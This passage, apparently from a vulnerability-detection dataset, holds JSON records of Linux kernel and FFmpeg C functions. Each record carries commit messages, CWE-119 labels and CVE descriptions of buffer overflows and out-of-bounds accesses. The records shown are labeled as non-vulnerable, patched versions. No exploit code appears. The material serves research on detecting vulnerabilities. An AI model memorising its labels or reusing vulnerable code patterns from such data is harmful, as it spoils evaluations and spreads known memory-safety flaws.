FUSE_IOCTL_UNRESTRICTED))\n\t\t\tgoto out;\n\n\t\tin_iovs = outarg.in_iovs;\n\t\tout_iovs = outarg.out_iovs;\n\n\t\t/*\n\t\t * Make sure things are in boundary, separate checks\n\t\t * are to protect against overflow.\n\t\t */\n\t\terr = -ENOMEM;\n\t\tif (in_iovs > FUSE_IOCTL_MAX_IOV ||\n\t\t    out_iovs > FUSE_IOCTL_MAX_IOV ||\n\t\t    in_iovs + out_iovs > FUSE_IOCTL_MAX_IOV)\n\t\t\tgoto out;\n\n\t\tvaddr = kmap_atomic(pages[0], KM_USER0);\n\t\terr = fuse_copy_ioctl_iovec(page_address(iov_page), vaddr,\n\t\t\t\t\t    transferred, in_iovs + out_iovs,\n\t\t\t\t\t    (flags & FUSE_IOCTL_COMPAT) != 0);\n\t\tkunmap_atomic(vaddr, KM_USER0);\n\t\tif (err)\n\t\t\tgoto out;\n\n \t\tin_iov = page_address(iov_page);\n \t\tout_iov = in_iov + in_iovs;\n \n\t\terr = fuse_verify_ioctl_iov(in_iov, in_iovs);\n\t\tif (err)\n\t\t\tgoto out;\n\n\t\terr = fuse_verify_ioctl_iov(out_iov, out_iovs);\n\t\tif (err)\n\t\t\tgoto out;\n\n \t\tgoto retry;\n \t}\n \n\terr = -EIO;\n\tif (transferred > inarg.out_size)\n\t\tgoto out;\n\n\terr = fuse_ioctl_copy_user(pages, out_iov, out_iovs, transferred, true);\n out:\n\tif (req)\n\t\tfuse_put_request(fc, req);\n\tif (iov_page)\n\t\t__free_page(iov_page);\n\twhile (num_pages)\n\t\t__free_page(pages[--num_pages]);\n\tkfree(pages);\n\n\treturn err ? err : outarg.result;\n}\n", "func_hash": 73869176651699469631819965635667453404, "file_name": "file.c", "file_hash": 316485230383673723348757172334976611504, "cwe": ["CWE-119"], "cve": "CVE-2010-4650", "cve_desc": "Buffer overflow in the fuse_do_ioctl function in fs/fuse/file.c in the Linux kernel before 2.6.37 allows local users to cause a denial of service or possibly have unspecified other impact by leveraging the ability to operate a CUSE server.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2010-4650"}
{"idx": 158723, "project": "linux", "commit_id": "f5563318ff1bde15b10e736e97ffce13be08bc1a", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/f5563318ff1bde15b10e736e97ffce13be08bc1a", "commit_message": "wireless: radiotap: fix parsing buffer overrun\n\nWhen parsing an invalid radiotap header, the parser can overrun\nthe buffer that is passed in because it doesn't correctly check\n 1) the minimum radiotap header size\n 2) the space for extended bitmaps\n\nThe first issue doesn't affect any in-kernel user as they all\ncheck the minimum size before calling the radiotap function.\nThe second issue could potentially affect the kernel if an skb\nis passed in that consists only of the radiotap header with a\nlot of extended bitmaps that extend past the SKB. In that case\na read-only buffer overrun by at most 4 bytes is possible.\n\nFix this by adding the appropriate checks to the parser.\n\nCc: stable@vger.kernel.org\nReported-by: Evan Huus <eapache@gmail.com>\nSigned-off-by: Johannes Berg <johannes.berg@intel.com>", "target": 0, "func": "int ieee80211_radiotap_iterator_init(\n\tstruct ieee80211_radiotap_iterator *iterator,\n \tstruct ieee80211_radiotap_header *radiotap_header,\n \tint max_length, const struct ieee80211_radiotap_vendor_namespaces *vns)\n {\n\t/* check the radiotap header can actually be present */\n\tif (max_length < sizeof(struct ieee80211_radiotap_header))\n\t\treturn -EINVAL;\n\n \t/* Linux only supports version 0 radiotap format */\n \tif (radiotap_header->it_version)\n \t\treturn -EINVAL;\n\n\t/* sanity check for allowed length and radiotap length field */\n\tif (max_length < get_unaligned_le16(&radiotap_header->it_len))\n\t\treturn -EINVAL;\n\n\titerator->_rtheader = radiotap_header;\n\titerator->_max_length = get_unaligned_le16(&radiotap_header->it_len);\n\titerator->_arg_index = 0;\n\titerator->_bitmap_shifter = get_unaligned_le32(&radiotap_header->it_present);\n\titerator->_arg = (uint8_t *)radiotap_header + sizeof(*radiotap_header);\n\titerator->_reset_on_ext = 0;\n\titerator->_next_bitmap = &radiotap_header->it_present;\n\titerator->_next_bitmap++;\n\titerator->_vns = vns;\n\titerator->current_namespace = &radiotap_ns;\n\titerator->is_radiotap_ns = 1;\n\n\t/* find payload start allowing for extended bitmap(s) */\n\n\tif (iterator->_bitmap_shifter & (1<<IEEE80211_RADIOTAP_EXT)) {\n\t\twhile (get_unaligned_le32(iterator->_arg) &\n\t\t\t\t\t(1 << IEEE80211_RADIOTAP_EXT)) {\n\t\t\titerator->_arg += sizeof(uint32_t);\n\n\t\t\t/*\n\t\t\t * check for insanity where the present bitmaps\n\t\t\t * keep claiming to extend up to or even beyond the\n\t\t\t * stated radiotap header length\n \t\t\t */\n \n \t\t\tif ((unsigned long)iterator->_arg -\n\t\t\t    (unsigned long)iterator->_rtheader +\n\t\t\t    sizeof(uint32_t) >\n \t\t\t    (unsigned long)iterator->_max_length)\n \t\t\t\treturn -EINVAL;\n \t\t}\n\n\t\titerator->_arg += sizeof(uint32_t);\n\n\t\t/*\n\t\t * no need to check again for blowing past stated radiotap\n\t\t * header length, because ieee80211_radiotap_iterator_next\n\t\t * checks it before it is dereferenced\n\t\t */\n\t}\n\n\titerator->this_arg = iterator->_arg;\n\n\t/* we are all initialized happily */\n\n\treturn 0;\n}\n", "func_hash": 293055781004458751821814114070443238337, "file_name": "radiotap.c", "file_hash": 23121824623036651781491045808747671484, "cwe": ["CWE-119"], "cve": "CVE-2013-7027", "cve_desc": "The ieee80211_radiotap_iterator_init function in net/wireless/radiotap.c in the Linux kernel before 3.11.7 does not check whether a frame contains any data outside of the header, which might allow attackers to cause a denial of service (buffer over-read) via a crafted header.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-7027"}
{"idx": 158727, "project": "FFmpeg", "commit_id": "f31011e9abfb2ae75bb32bc44e2c34194c8dc40a", "project_url": "https://github.com/FFmpeg/FFmpeg", "commit_url": "https://github.com/FFmpeg/FFmpeg/commit/f31011e9abfb2ae75bb32bc44e2c34194c8dc40a", "commit_message": "avcodec/parser: reset indexes on realloc failure\n\nFixes Ticket2982\n\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>", "target": 0, "func": "int ff_combine_frame(ParseContext *pc, int next, const uint8_t **buf, int *buf_size)\n{\n    if(pc->overread){\n        av_dlog(NULL, \"overread %d, state:%X next:%d index:%d o_index:%d\\n\",\n                pc->overread, pc->state, next, pc->index, pc->overread_index);\n        av_dlog(NULL, \"%X %X %X %X\\n\", (*buf)[0], (*buf)[1], (*buf)[2], (*buf)[3]);\n    }\n\n    /* Copy overread bytes from last frame into buffer. */\n    for(; pc->overread>0; pc->overread--){\n        pc->buffer[pc->index++]= pc->buffer[pc->overread_index++];\n    }\n\n    /* flush remaining if EOF */\n    if(!*buf_size && next == END_NOT_FOUND){\n        next= 0;\n    }\n\n    pc->last_index= pc->index;\n\n    /* copy into buffer end return */\n     if(next == END_NOT_FOUND){\n         void* new_buffer = av_fast_realloc(pc->buffer, &pc->buffer_size, (*buf_size) + pc->index + FF_INPUT_BUFFER_PADDING_SIZE);\n \n        if(!new_buffer) {\n            pc->index = 0;\n             return AVERROR(ENOMEM);\n        }\n         pc->buffer = new_buffer;\n         memcpy(&pc->buffer[pc->index], *buf, *buf_size);\n         pc->index += *buf_size;\n        return -1;\n    }\n\n    *buf_size=\n    pc->overread_index= pc->index + next;\n\n     /* append to buffer */\n     if(pc->index){\n         void* new_buffer = av_fast_realloc(pc->buffer, &pc->buffer_size, next + pc->index + FF_INPUT_BUFFER_PADDING_SIZE);\n        if(!new_buffer) {\n            pc->overread_index =\n            pc->index = 0;\n             return AVERROR(ENOMEM);\n        }\n         pc->buffer = new_buffer;\n         if (next > -FF_INPUT_BUFFER_PADDING_SIZE)\n             memcpy(&pc->buffer[pc->index], *buf,\n                   next + FF_INPUT_BUFFER_PADDING_SIZE);\n        pc->index = 0;\n        *buf= pc->buffer;\n    }\n\n    /* store overread bytes */\n    for(;next < 0; next++){\n        pc->state = (pc->state<<8) | pc->buffer[pc->last_index + next];\n        pc->state64 = (pc->state64<<8) | pc->buffer[pc->last_index + next];\n        pc->overread++;\n    }\n\n    if(pc->overread){\n        av_dlog(NULL, \"overread %d, state:%X next:%d index:%d o_index:%d\\n\",\n                pc->overread, pc->state, next, pc->index, pc->overread_index);\n        av_dlog(NULL, \"%X %X %X %X\\n\", (*buf)[0], (*buf)[1],(*buf)[2],(*buf)[3]);\n    }\n\n    return 0;\n}\n", "func_hash": 140651272046924709040495532214522141021, "file_name": "parser.c", "file_hash": 105227933394977883394091717119289145022, "cwe": ["CWE-119"], "cve": "CVE-2013-7023", "cve_desc": "The ff_combine_frame function in libavcodec/parser.c in FFmpeg before 2.1 does not properly handle certain memory-allocation errors, which allows remote attackers to cause a denial of service (out-of-bounds array access) or possibly have unspecified other impact via crafted data.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-7023"}
{"idx": 158728, "project": "FFmpeg", "commit_id": "e07ac727c1cc9eed39e7f9117c97006f719864bd", "project_url": "https://github.com/FFmpeg/FFmpeg", "commit_url": "https://github.com/FFmpeg/FFmpeg/commit/e07ac727c1cc9eed39e7f9117c97006f719864bd", "commit_message": "avcodec/g2meet: Fix framebuf size\n\nCurrently the code can in some cases draw tiles that hang outside the\nallocated buffer. This patch increases the buffer size to avoid out\nof array accesses. An alternative would be to fail if such tiles are\nencountered.\nI do not know if any valid files use such hanging tiles.\n\nFixes Ticket2971\nFound-by: ami_stuff\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>", "target": 0, "func": "static int g2m_init_buffers(G2MContext *c)\n{\n     int aligned_height;\n \n     if (!c->framebuf || c->old_width < c->width || c->old_height < c->height) {\n        c->framebuf_stride = FFALIGN(c->width + 15, 16) * 3;\n        aligned_height     = c->height + 15;\n         av_free(c->framebuf);\n         c->framebuf = av_mallocz(c->framebuf_stride * aligned_height);\n         if (!c->framebuf)\n            return AVERROR(ENOMEM);\n    }\n    if (!c->synth_tile || !c->jpeg_tile ||\n        c->old_tile_w < c->tile_width ||\n        c->old_tile_h < c->tile_height) {\n        c->tile_stride = FFALIGN(c->tile_width, 16) * 3;\n        aligned_height = FFALIGN(c->tile_height,    16);\n        av_free(c->synth_tile);\n        av_free(c->jpeg_tile);\n        av_free(c->kempf_buf);\n        av_free(c->kempf_flags);\n        c->synth_tile  = av_mallocz(c->tile_stride      * aligned_height);\n        c->jpeg_tile   = av_mallocz(c->tile_stride      * aligned_height);\n        c->kempf_buf   = av_mallocz((c->tile_width + 1) * aligned_height\n                                    + FF_INPUT_BUFFER_PADDING_SIZE);\n        c->kempf_flags = av_mallocz( c->tile_width      * aligned_height);\n        if (!c->synth_tile || !c->jpeg_tile ||\n            !c->kempf_buf || !c->kempf_flags)\n            return AVERROR(ENOMEM);\n    }\n\n    return 0;\n}\n", "func_hash": 49709330371647019348189373603886921255, "file_name": "g2meet.c", "file_hash": 165207066110261879036082118616062180464, "cwe": ["CWE-119"], "cve": "CVE-2013-7022", "cve_desc": "The g2m_init_buffers function in libavcodec/g2meet.c in FFmpeg before 2.1 does not properly allocate memory for tiles, which allows remote attackers to cause a denial of service (out-of-bounds array access) or possibly have unspecified other impact via crafted Go2Webinar data.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-7022"}
{"idx": 158730, "project": "FFmpeg", "commit_id": "b05cd1ea7e45a836f7f6071a716c38bb30326e0f", "project_url": "https://github.com/FFmpeg/FFmpeg", "commit_url": "https://github.com/FFmpeg/FFmpeg/commit/b05cd1ea7e45a836f7f6071a716c38bb30326e0f", "commit_message": "ffv1dec: Check bits_per_raw_sample and colorspace for equality in ver 0/1 headers\n\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>", "target": 0, "func": "static int read_header(FFV1Context *f)\n{\n    uint8_t state[CONTEXT_SIZE];\n    int i, j, context_count = -1; //-1 to avoid warning\n    RangeCoder *const c = &f->slice_context[0]->c;\n\n     memset(state, 128, sizeof(state));\n \n     if (f->version < 2) {\n        int chroma_planes, chroma_h_shift, chroma_v_shift, transparency, colorspace, bits_per_raw_sample;\n         unsigned v= get_symbol(c, state, 0);\n         if (v >= 2) {\n             av_log(f->avctx, AV_LOG_ERROR, \"invalid version %d in ver01 header\\n\", v);\n            return AVERROR_INVALIDDATA;\n        }\n        f->version = v;\n        f->ac      = f->avctx->coder_type = get_symbol(c, state, 0);\n        if (f->ac > 1) {\n            for (i = 1; i < 256; i++)\n                 f->state_transition[i] = get_symbol(c, state, 1) + c->one_state[i];\n         }\n \n        colorspace     = get_symbol(c, state, 0); //YUV cs type\n        bits_per_raw_sample = f->version > 0 ? get_symbol(c, state, 0) : f->avctx->bits_per_raw_sample;\n         chroma_planes  = get_rac(c, state);\n         chroma_h_shift = get_symbol(c, state, 0);\n         chroma_v_shift = get_symbol(c, state, 0);\n         transparency   = get_rac(c, state);\n \n         if (f->plane_count) {\n            if (   colorspace    != f->colorspace\n                || bits_per_raw_sample != f->avctx->bits_per_raw_sample\n                || chroma_planes != f->chroma_planes\n                 || chroma_h_shift!= f->chroma_h_shift\n                 || chroma_v_shift!= f->chroma_v_shift\n                 || transparency  != f->transparency) {\n                av_log(f->avctx, AV_LOG_ERROR, \"Invalid change of global parameters\\n\");\n                return AVERROR_INVALIDDATA;\n             }\n         }\n \n        f->colorspace     = colorspace;\n        f->avctx->bits_per_raw_sample = bits_per_raw_sample;\n         f->chroma_planes  = chroma_planes;\n         f->chroma_h_shift = chroma_h_shift;\n         f->chroma_v_shift = chroma_v_shift;\n        f->transparency   = transparency;\n\n        f->plane_count    = 2 + f->transparency;\n    }\n\n    if (f->colorspace == 0) {\n        if (!f->transparency && !f->chroma_planes) {\n            if (f->avctx->bits_per_raw_sample <= 8)\n                f->avctx->pix_fmt = AV_PIX_FMT_GRAY8;\n            else\n                f->avctx->pix_fmt = AV_PIX_FMT_GRAY16;\n        } else if (f->avctx->bits_per_raw_sample<=8 && !f->transparency) {\n            switch(16 * f->chroma_h_shift + f->chroma_v_shift) {\n            case 0x00: f->avctx->pix_fmt = AV_PIX_FMT_YUV444P; break;\n            case 0x01: f->avctx->pix_fmt = AV_PIX_FMT_YUV440P; break;\n            case 0x10: f->avctx->pix_fmt = AV_PIX_FMT_YUV422P; break;\n            case 0x11: f->avctx->pix_fmt = AV_PIX_FMT_YUV420P; break;\n            case 0x20: f->avctx->pix_fmt = AV_PIX_FMT_YUV411P; break;\n            case 0x22: f->avctx->pix_fmt = AV_PIX_FMT_YUV410P; break;\n            default:\n                av_log(f->avctx, AV_LOG_ERROR, \"format not supported\\n\");\n                return AVERROR(ENOSYS);\n            }\n        } else if (f->avctx->bits_per_raw_sample <= 8 && f->transparency) {\n            switch(16*f->chroma_h_shift + f->chroma_v_shift) {\n            case 0x00: f->avctx->pix_fmt = AV_PIX_FMT_YUVA444P; break;\n            case 0x10: f->avctx->pix_fmt = AV_PIX_FMT_YUVA422P; break;\n            case 0x11: f->avctx->pix_fmt = AV_PIX_FMT_YUVA420P; break;\n            default:\n                av_log(f->avctx, AV_LOG_ERROR, \"format not supported\\n\");\n                return AVERROR(ENOSYS);\n            }\n        } else if (f->avctx->bits_per_raw_sample == 9) {\n            f->packed_at_lsb = 1;\n            switch(16 * f->chroma_h_shift + f->chroma_v_shift) {\n            case 0x00: f->avctx->pix_fmt = AV_PIX_FMT_YUV444P9; break;\n            case 0x10: f->avctx->pix_fmt = AV_PIX_FMT_YUV422P9; break;\n            case 0x11: f->avctx->pix_fmt = AV_PIX_FMT_YUV420P9; break;\n            default:\n                av_log(f->avctx, AV_LOG_ERROR, \"format not supported\\n\");\n                return AVERROR(ENOSYS);\n            }\n        } else if (f->avctx->bits_per_raw_sample == 10) {\n            f->packed_at_lsb = 1;\n            switch(16 * f->chroma_h_shift + f->chroma_v_shift) {\n            case 0x00: f->avctx->pix_fmt = AV_PIX_FMT_YUV444P10; break;\n            case 0x10: f->avctx->pix_fmt = AV_PIX_FMT_YUV422P10; break;\n            case 0x11: f->avctx->pix_fmt = AV_PIX_FMT_YUV420P10; break;\n            default:\n                av_log(f->avctx, AV_LOG_ERROR, \"format not supported\\n\");\n                return AVERROR(ENOSYS);\n            }\n        } else {\n            switch(16 * f->chroma_h_shift + f->chroma_v_shift) {\n            case 0x00: f->avctx->pix_fmt = AV_PIX_FMT_YUV444P16; break;\n            case 0x10: f->avctx->pix_fmt = AV_PIX_FMT_YUV422P16; break;\n            case 0x11: f->avctx->pix_fmt = AV_PIX_FMT_YUV420P16; break;\n            default:\n                av_log(f->avctx, AV_LOG_ERROR, \"format not supported\\n\");\n                return AVERROR(ENOSYS);\n            }\n        }\n    } else if (f->colorspace == 1) {\n        if (f->chroma_h_shift || f->chroma_v_shift) {\n            av_log(f->avctx, AV_LOG_ERROR,\n                   \"chroma subsampling not supported in this colorspace\\n\");\n            return AVERROR(ENOSYS);\n        }\n        if (     f->avctx->bits_per_raw_sample ==  9)\n            f->avctx->pix_fmt = AV_PIX_FMT_GBRP9;\n        else if (f->avctx->bits_per_raw_sample == 10)\n            f->avctx->pix_fmt = AV_PIX_FMT_GBRP10;\n        else if (f->avctx->bits_per_raw_sample == 12)\n            f->avctx->pix_fmt = AV_PIX_FMT_GBRP12;\n        else if (f->avctx->bits_per_raw_sample == 14)\n            f->avctx->pix_fmt = AV_PIX_FMT_GBRP14;\n        else\n        if (f->transparency) f->avctx->pix_fmt = AV_PIX_FMT_RGB32;\n        else                 f->avctx->pix_fmt = AV_PIX_FMT_0RGB32;\n    } else {\n        av_log(f->avctx, AV_LOG_ERROR, \"colorspace not supported\\n\");\n        return AVERROR(ENOSYS);\n    }\n\n    av_dlog(f->avctx, \"%d %d %d\\n\",\n            f->chroma_h_shift, f->chroma_v_shift, f->avctx->pix_fmt);\n    if (f->version < 2) {\n        context_count = read_quant_tables(c, f->quant_table);\n        if (context_count < 0) {\n            av_log(f->avctx, AV_LOG_ERROR, \"read_quant_table error\\n\");\n            return AVERROR_INVALIDDATA;\n        }\n    } else if (f->version < 3) {\n        f->slice_count = get_symbol(c, state, 0);\n    } else {\n        const uint8_t *p = c->bytestream_end;\n        for (f->slice_count = 0;\n             f->slice_count < MAX_SLICES && 3 < p - c->bytestream_start;\n             f->slice_count++) {\n            int trailer = 3 + 5*!!f->ec;\n            int size = AV_RB24(p-trailer);\n            if (size + trailer > p - c->bytestream_start)\n                break;\n            p -= size + trailer;\n        }\n    }\n    if (f->slice_count > (unsigned)MAX_SLICES || f->slice_count <= 0) {\n        av_log(f->avctx, AV_LOG_ERROR, \"slice count %d is invalid\\n\", f->slice_count);\n        return AVERROR_INVALIDDATA;\n    }\n\n    for (j = 0; j < f->slice_count; j++) {\n        FFV1Context *fs = f->slice_context[j];\n        fs->ac            = f->ac;\n        fs->packed_at_lsb = f->packed_at_lsb;\n\n        fs->slice_damaged = 0;\n\n        if (f->version == 2) {\n            fs->slice_x      =  get_symbol(c, state, 0)      * f->width ;\n            fs->slice_y      =  get_symbol(c, state, 0)      * f->height;\n            fs->slice_width  = (get_symbol(c, state, 0) + 1) * f->width  + fs->slice_x;\n            fs->slice_height = (get_symbol(c, state, 0) + 1) * f->height + fs->slice_y;\n\n            fs->slice_x     /= f->num_h_slices;\n            fs->slice_y     /= f->num_v_slices;\n            fs->slice_width  = fs->slice_width  / f->num_h_slices - fs->slice_x;\n            fs->slice_height = fs->slice_height / f->num_v_slices - fs->slice_y;\n            if ((unsigned)fs->slice_width  > f->width ||\n                (unsigned)fs->slice_height > f->height)\n                return AVERROR_INVALIDDATA;\n            if (   (unsigned)fs->slice_x + (uint64_t)fs->slice_width  > f->width\n                || (unsigned)fs->slice_y + (uint64_t)fs->slice_height > f->height)\n                return AVERROR_INVALIDDATA;\n        }\n\n        for (i = 0; i < f->plane_count; i++) {\n            PlaneContext *const p = &fs->plane[i];\n\n            if (f->version == 2) {\n                int idx = get_symbol(c, state, 0);\n                if (idx > (unsigned)f->quant_table_count) {\n                    av_log(f->avctx, AV_LOG_ERROR,\n                           \"quant_table_index out of range\\n\");\n                    return AVERROR_INVALIDDATA;\n                }\n                p->quant_table_index = idx;\n                memcpy(p->quant_table, f->quant_tables[idx],\n                       sizeof(p->quant_table));\n                context_count = f->context_count[idx];\n            } else {\n                memcpy(p->quant_table, f->quant_table, sizeof(p->quant_table));\n            }\n\n            if (f->version <= 2) {\n                av_assert0(context_count >= 0);\n                if (p->context_count < context_count) {\n                    av_freep(&p->state);\n                    av_freep(&p->vlc_state);\n                }\n                p->context_count = context_count;\n            }\n        }\n    }\n    return 0;\n}\n", "func_hash": 89588011034658391000654551724666371677, "file_name": "ffv1dec.c", "file_hash": 319230643551834163571899636845765840546, "cwe": ["CWE-119"], "cve": "CVE-2013-7020", "cve_desc": "The read_header function in libavcodec/ffv1dec.c in FFmpeg before 2.1 does not properly enforce certain bit-count and colorspace constraints, which allows remote attackers to cause a denial of service (out-of-bounds array access) or possibly have unspecified other impact via crafted FFV1 data.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-7020"}
{"idx": 158734, "project": "FFmpeg", "commit_id": "780669ef7c23c00836a24921fcc6b03be2b8ca4a", "project_url": "https://github.com/FFmpeg/FFmpeg", "commit_url": "https://github.com/FFmpeg/FFmpeg/commit/780669ef7c23c00836a24921fcc6b03be2b8ca4a", "commit_message": "avcodec/jpeg2000dec: non zero image offsets are not supported\n\nFixes out of array accesses\nFixes Ticket3080\nFound-by: ami_stuff\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>", "target": 0, "func": "static int get_siz(Jpeg2000DecoderContext *s)\n{\n    int i;\n    int ncomponents;\n    uint32_t log2_chroma_wh = 0;\n    const enum AVPixelFormat *possible_fmts = NULL;\n    int possible_fmts_nb = 0;\n\n    if (bytestream2_get_bytes_left(&s->g) < 36)\n        return AVERROR_INVALIDDATA;\n\n    s->avctx->profile = bytestream2_get_be16u(&s->g); // Rsiz\n    s->width          = bytestream2_get_be32u(&s->g); // Width\n    s->height         = bytestream2_get_be32u(&s->g); // Height\n    s->image_offset_x = bytestream2_get_be32u(&s->g); // X0Siz\n    s->image_offset_y = bytestream2_get_be32u(&s->g); // Y0Siz\n    s->tile_width     = bytestream2_get_be32u(&s->g); // XTSiz\n    s->tile_height    = bytestream2_get_be32u(&s->g); // YTSiz\n    s->tile_offset_x  = bytestream2_get_be32u(&s->g); // XT0Siz\n     s->tile_offset_y  = bytestream2_get_be32u(&s->g); // YT0Siz\n     ncomponents       = bytestream2_get_be16u(&s->g); // CSiz\n \n    if (s->image_offset_x || s->image_offset_y) {\n        avpriv_request_sample(s->avctx, \"Support for image offsets\");\n        return AVERROR_PATCHWELCOME;\n    }\n\n     if (ncomponents <= 0) {\n         av_log(s->avctx, AV_LOG_ERROR, \"Invalid number of components: %d\\n\",\n                s->ncomponents);\n        return AVERROR_INVALIDDATA;\n    }\n\n    if (ncomponents > 4) {\n        avpriv_request_sample(s->avctx, \"Support for %d components\",\n                              s->ncomponents);\n        return AVERROR_PATCHWELCOME;\n    }\n\n    s->ncomponents = ncomponents;\n\n    if (s->tile_width <= 0 || s->tile_height <= 0) {\n        av_log(s->avctx, AV_LOG_ERROR, \"Invalid tile dimension %dx%d.\\n\",\n               s->tile_width, s->tile_height);\n        return AVERROR_INVALIDDATA;\n    }\n\n    if (bytestream2_get_bytes_left(&s->g) < 3 * s->ncomponents)\n        return AVERROR_INVALIDDATA;\n\n    for (i = 0; i < s->ncomponents; i++) { // Ssiz_i XRsiz_i, YRsiz_i\n        uint8_t x    = bytestream2_get_byteu(&s->g);\n        s->cbps[i]   = (x & 0x7f) + 1;\n        s->precision = FFMAX(s->cbps[i], s->precision);\n        s->sgnd[i]   = !!(x & 0x80);\n        s->cdx[i]    = bytestream2_get_byteu(&s->g);\n        s->cdy[i]    = bytestream2_get_byteu(&s->g);\n        if (   !s->cdx[i] || s->cdx[i] == 3 || s->cdx[i] > 4\n            || !s->cdy[i] || s->cdy[i] == 3 || s->cdy[i] > 4) {\n            av_log(s->avctx, AV_LOG_ERROR, \"Invalid sample separation %d/%d\\n\", s->cdx[i], s->cdy[i]);\n            return AVERROR_INVALIDDATA;\n        }\n        log2_chroma_wh |= s->cdy[i] >> 1 << i * 4 | s->cdx[i] >> 1 << i * 4 + 2;\n    }\n\n    s->numXtiles = ff_jpeg2000_ceildiv(s->width  - s->tile_offset_x, s->tile_width);\n    s->numYtiles = ff_jpeg2000_ceildiv(s->height - s->tile_offset_y, s->tile_height);\n\n    if (s->numXtiles * (uint64_t)s->numYtiles > INT_MAX/sizeof(*s->tile)) {\n        s->numXtiles = s->numYtiles = 0;\n        return AVERROR(EINVAL);\n    }\n\n    s->tile = av_mallocz_array(s->numXtiles * s->numYtiles, sizeof(*s->tile));\n    if (!s->tile) {\n        s->numXtiles = s->numYtiles = 0;\n        return AVERROR(ENOMEM);\n    }\n\n    for (i = 0; i < s->numXtiles * s->numYtiles; i++) {\n        Jpeg2000Tile *tile = s->tile + i;\n\n        tile->comp = av_mallocz(s->ncomponents * sizeof(*tile->comp));\n        if (!tile->comp)\n            return AVERROR(ENOMEM);\n    }\n\n    /* compute image size with reduction factor */\n    s->avctx->width  = ff_jpeg2000_ceildivpow2(s->width  - s->image_offset_x,\n                                               s->reduction_factor);\n    s->avctx->height = ff_jpeg2000_ceildivpow2(s->height - s->image_offset_y,\n                                               s->reduction_factor);\n\n    if (s->avctx->profile == FF_PROFILE_JPEG2000_DCINEMA_2K ||\n        s->avctx->profile == FF_PROFILE_JPEG2000_DCINEMA_4K) {\n        possible_fmts = xyz_pix_fmts;\n        possible_fmts_nb = FF_ARRAY_ELEMS(xyz_pix_fmts);\n    } else {\n        switch (s->colour_space) {\n        case 16:\n            possible_fmts = rgb_pix_fmts;\n            possible_fmts_nb = FF_ARRAY_ELEMS(rgb_pix_fmts);\n            break;\n        case 17:\n            possible_fmts = gray_pix_fmts;\n            possible_fmts_nb = FF_ARRAY_ELEMS(gray_pix_fmts);\n            break;\n        case 18:\n            possible_fmts = yuv_pix_fmts;\n            possible_fmts_nb = FF_ARRAY_ELEMS(yuv_pix_fmts);\n            break;\n        default:\n            possible_fmts = all_pix_fmts;\n            possible_fmts_nb = FF_ARRAY_ELEMS(all_pix_fmts);\n            break;\n        }\n    }\n    for (i = 0; i < possible_fmts_nb; ++i) {\n        if (pix_fmt_match(possible_fmts[i], ncomponents, s->precision, log2_chroma_wh, s->pal8)) {\n            s->avctx->pix_fmt = possible_fmts[i];\n            break;\n        }\n    }\n    if (s->avctx->pix_fmt == AV_PIX_FMT_NONE) {\n        av_log(s->avctx, AV_LOG_ERROR,\n               \"Unknown pix_fmt, profile: %d, colour_space: %d, \"\n               \"components: %d, precision: %d, \"\n               \"cdx[1]: %d, cdy[1]: %d, cdx[2]: %d, cdy[2]: %d\\n\",\n               s->avctx->profile, s->colour_space, ncomponents, s->precision,\n               ncomponents > 2 ? s->cdx[1] : 0,\n               ncomponents > 2 ? s->cdy[1] : 0,\n               ncomponents > 2 ? s->cdx[2] : 0,\n               ncomponents > 2 ? s->cdy[2] : 0);\n    }\n    s->avctx->bits_per_raw_sample = s->precision;\n    return 0;\n}\n", "func_hash": 111165660664067912894378699928933381241, "file_name": "jpeg2000dec.c", "file_hash": 223101191426622229699083725655095766483, "cwe": ["CWE-119"], "cve": "CVE-2013-7012", "cve_desc": "The get_siz function in libavcodec/jpeg2000dec.c in FFmpeg before 2.1 does not prevent attempts to use non-zero image offsets, which allows remote attackers to cause a denial of service (out-of-bounds array access) or possibly have unspecified other impact via crafted JPEG2000 data.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-7012"}
{"idx": 158737, "project": "FFmpeg", "commit_id": "3819db745da2ac7fb3faacb116788c32f4753f34", "project_url": "https://github.com/FFmpeg/FFmpeg", "commit_url": "https://github.com/FFmpeg/FFmpeg/commit/3819db745da2ac7fb3faacb116788c32f4753f34", "commit_message": "avcodec/rpza: Perform pointer advance and checks before using the pointers\n\nFixes out of array accesses\nFixes Ticket2850\n\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>", "target": 0, "func": "static void rpza_decode_stream(RpzaContext *s)\n{\n    int width = s->avctx->width;\n    int stride = s->frame.linesize[0] / 2;\n    int row_inc = stride - 4;\n    int stream_ptr = 0;\n    int chunk_size;\n    unsigned char opcode;\n    int n_blocks;\n    unsigned short colorA = 0, colorB;\n    unsigned short color4[4];\n    unsigned char index, idx;\n    unsigned short ta, tb;\n     unsigned short *pixels = (unsigned short *)s->frame.data[0];\n \n     int row_ptr = 0;\n    int pixel_ptr = -4;\n     int block_ptr;\n     int pixel_x, pixel_y;\n     int total_blocks;\n\n    /* First byte is always 0xe1. Warn if it's different */\n    if (s->buf[stream_ptr] != 0xe1)\n        av_log(s->avctx, AV_LOG_ERROR, \"First chunk byte is 0x%02x instead of 0xe1\\n\",\n            s->buf[stream_ptr]);\n\n    /* Get chunk size, ingnoring first byte */\n    chunk_size = AV_RB32(&s->buf[stream_ptr]) & 0x00FFFFFF;\n    stream_ptr += 4;\n\n    /* If length mismatch use size from MOV file and try to decode anyway */\n    if (chunk_size != s->size)\n        av_log(s->avctx, AV_LOG_ERROR, \"MOV chunk size != encoded chunk size; using MOV chunk size\\n\");\n\n    chunk_size = s->size;\n\n    /* Number of 4x4 blocks in frame. */\n    total_blocks = ((s->avctx->width + 3) / 4) * ((s->avctx->height + 3) / 4);\n\n    /* Process chunk data */\n    while (stream_ptr < chunk_size) {\n        opcode = s->buf[stream_ptr++]; /* Get opcode */\n\n        n_blocks = (opcode & 0x1f) + 1; /* Extract block counter from opcode */\n\n        /* If opcode MSbit is 0, we need more data to decide what to do */\n        if ((opcode & 0x80) == 0) {\n            colorA = (opcode << 8) | 